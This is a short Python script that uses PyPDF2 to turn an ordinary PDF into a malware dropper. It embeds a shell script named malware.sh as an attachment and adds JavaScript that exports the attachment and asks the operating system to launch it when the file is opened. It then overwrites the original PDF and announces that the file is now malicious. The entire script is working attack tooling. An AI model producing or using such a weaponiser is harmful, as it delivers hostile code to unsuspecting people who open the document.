import PyPDF2

doc = "hello.pdf"

malwareScriptFile = "malware.sh"
malwareScript = open(malwareScriptFile, "r").read()

unmeta = PyPDF2.PdfFileReader(doc, "rb")

meta = PyPDF2.PdfFileWriter()

meta.appendPagesFromReader(unmeta)

meta.addAttachment(malwareScriptFile, malwareScript.encode())

meta.addJS("this.exportDataObject({cName: 'malware.sh',nLaunch: 2,});")

# nLaunch is just an integer, and it has three valid values:

# Prompt the user for a path and save the file there
# Prompt the user for a path, save the file, and ask the operating system to open it
# Pick a temporary location, save the file there, and ask the operating system to open it


with open(doc, 'wb') as fp:
    meta.write(fp)

print "[!] The file "+doc+" is malicious with the malware : "+malwareScriptFile
